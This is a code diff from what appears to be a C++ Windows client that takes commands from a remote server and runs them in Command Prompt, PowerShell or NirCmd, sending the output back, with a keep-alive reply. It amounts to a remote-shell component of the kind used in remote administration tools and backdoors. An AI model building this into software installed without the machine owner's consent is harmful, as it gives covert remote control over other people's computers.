@@ -34,13 +34,22 @@ void client::data_parser(string type, int size, string data)
 			<< "TEXT: " << data << endl;
 	}
 	else if (type == "ALIV") {
+		cout << endl << "isAlive() -> Send(\"OK\")" << endl;
 		send_data("OK", "ALIV");
 	}
-	else if (type == "CMDE") { // command execute only once
-		cout << "execute:" << data << endl;
+	else if (type == "CMDO") { // execute only CMD(O)nce
 		cmd_init(CommandPrompt);
-		string output;
-		command(data, output);
+		command(data);
+	}
+	else if (type == "POSO") {
+		cmd_init(PowerShell);
+		command(data);
+	}
+	else if (type == "NIRO") {
+		cmd_init(NirCmd);
+		bool output;
+		nircmd(data, output);
+		send_data((output) ? "True" : "False", "NIRB");
 	}
 	else if (type == "CMDS") { // command prompt shell interactive START
 		cout << "TYPE: " << type << endl
@@ -375,12 +384,15 @@ bool client::read_and_send(string command, int length) {
 			bool end_ps = (last2chars == "> ");
 
 			bool end_cst = (last2chars == custom_esc);
+			if (active_prompt == CommandPrompt) {
+				send_data(output.substr(command_index), "CMDO");
+			}
+			else if (active_prompt == PowerShell) {
+				send_data(output.substr(command_index), "POSO");
+			}
 			
-			send_data(output.substr(command_index), "CMDO");
 			
 			if (end_cmd || end_ps || end_cst) {
-				//free(output_cmd);
-				//output_cmd = NULL;
 				break;
 			}
 		}
@@ -388,7 +400,12 @@ bool client::read_and_send(string command, int length) {
 			break;
 		}
 	}
-	send_data(" ", "CMDE");
+	if (active_prompt == CommandPrompt) {
+		send_data(" ", "CMDE");
+	}
+	else if (active_prompt == PowerShell) {
+		send_data(" ", "POSE");
+	}
 	return 0;
 }
 
@@ -569,34 +586,32 @@ void client::cmd_init(int type, bool output, int delay, int pipe_size)
 
 	// BITWISE - Comparison works by returning the int by the bitwise cmp and if the int is nonzero then the output equals true else false.
 	if (type & CommandPrompt) {
+		active_prompt = CommandPrompt;
 		initilize_cmd(output);
 	}
 	if (type & PowerShell) {
+		active_prompt = PowerShell;
 		initilize_ps(output);
 	}
 	if (type & NirCmd) {
+		active_prompt = NirCmd;
 		initilize_nirsoft();
 	}
 }
 
-void client::nircmd(string command)
+void client::nircmd(string command, bool &output)
 {
-	bool sucess = nirsofter((LPSTR)command.c_str());
-	if (sucess) {
-		cout << "Succesfully ran nircmd(\"" << command << "\");";
-	}
-	else {
-		cout << "Failed to run, \"" << command << "\" is probably not a real nircmd command";
-	}
-	client::command();
+	output = nirsofter((LPSTR)command.c_str());
 }
 
 void client::command(string command)
 {
 	if (nircmd_presence(command)) {
-		nircmd(command.substr(7)); // use 7 to include parser space
+		bool output;
+		nircmd(command.substr(7), output); // use 7 to include parser space
 	}
-	else if (command == "exit") { //use !exit to call internal exit
+	else
+	if (command == "exit") { //use !exit to call internal exit
 		client::endme();
 	}
 	else {
@@ -611,42 +626,8 @@ void client::command(string command)
 		int command_size;
 
 		client::write_cmd(parsed_command.c_str(), command_size);
-
-		string otp;
-
-		client::read_cmd(parsed_command.c_str(), command_size, otp);
-		//cout << output << endl;
-	}
-
-	return;
-}
-
-void client::command(string command, string &output)
-{
-	if (nircmd_presence(command)) {
-		nircmd(command.substr(7)); // use 7 to include parser space
-	}
-	else if (command == "exit") { //use !exit to call internal exit
-		client::endme();
-	}
-	else {
-		string parsed_command;
-		if (command[0] == '!') {
-			parsed_command = command.substr(1);
-		}
-		else {
-			parsed_command = command;
-		}
-
-		int command_size;
-
-		client::write_cmd(parsed_command.c_str(), command_size);
-
-		string output_str;
 
 		client::read_and_send(parsed_command.c_str(), command_size);
-
-		output = output_str;
 	}
 
 	return;
